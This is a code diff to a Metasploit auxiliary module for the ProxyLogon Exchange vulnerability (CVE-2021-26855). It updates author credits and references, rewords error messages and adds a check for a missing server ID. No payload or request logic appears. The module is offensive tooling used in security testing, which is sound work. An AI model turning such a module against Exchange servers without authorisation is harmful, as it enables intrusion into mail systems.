@@ -27,14 +27,17 @@ class MetasploitModule < Msf::Auxiliary
           All components are vulnerable by default.
         },
         'Author' => [
-          'mekhalleh (RAMELLA Sébastien)' # Module author (Zeop Entreprise)
+          'Orange Tsai', # Dicovery (Officially acknowledged by MSRC)
+          'GreyOrder', # PoC (https://github.com/GreyOrder)
+          'mekhalleh (RAMELLA Sébastien)' # Module author independent researcher (work at Zeop Entreprise)
         ],
         'References' => [
           ['CVE', '2021-26855'],
           ['LOGO', 'https://proxylogon.com/images/logo.jpg'],
           ['URL', 'https://proxylogon.com/'],
-          ['URL', 'http://aka.ms/exchangevulns'],
-          ['URL', 'https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/distinguishedfolderid']
+          ['URL', 'https://aka.ms/exchangevulns'],
+          ['URL', 'https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/distinguishedfolderid'],
+          ['URL', 'https://github.com/3gstudent/Homework-of-Python/blob/master/ewsManage.py']
         ],
         'DisclosureDate' => '2021-03-02',
         'License' => MSF_LICENSE,
@@ -185,7 +188,7 @@ class MetasploitModule < Msf::Auxiliary
     xml = Nokogiri::XML.parse(response.body)
 
     legacy_dn = xml.at_xpath('//xmlns:User/xmlns:LegacyDN', xmlns).content
-    fail_with(Failure::Unknown, 'The \'LegacyDN\' value could not be found') if legacy_dn.empty?
+    fail_with(Failure::Unknown, 'No \'LegacyDN\' was found') if legacy_dn.empty?
 
     server = ''
     owa_urls = []
@@ -201,6 +204,7 @@ class MetasploitModule < Msf::Auxiliary
         owa_urls << owa_url.content
       end
     end
+    fail_with(Failure::Unknown, 'No \'Server ID\' was found') if server.empty?
     fail_with(Failure::Unknown, 'No \'OWAUrl\' was found') if owa_urls.empty?
 
     return([server, legacy_dn, owa_urls])
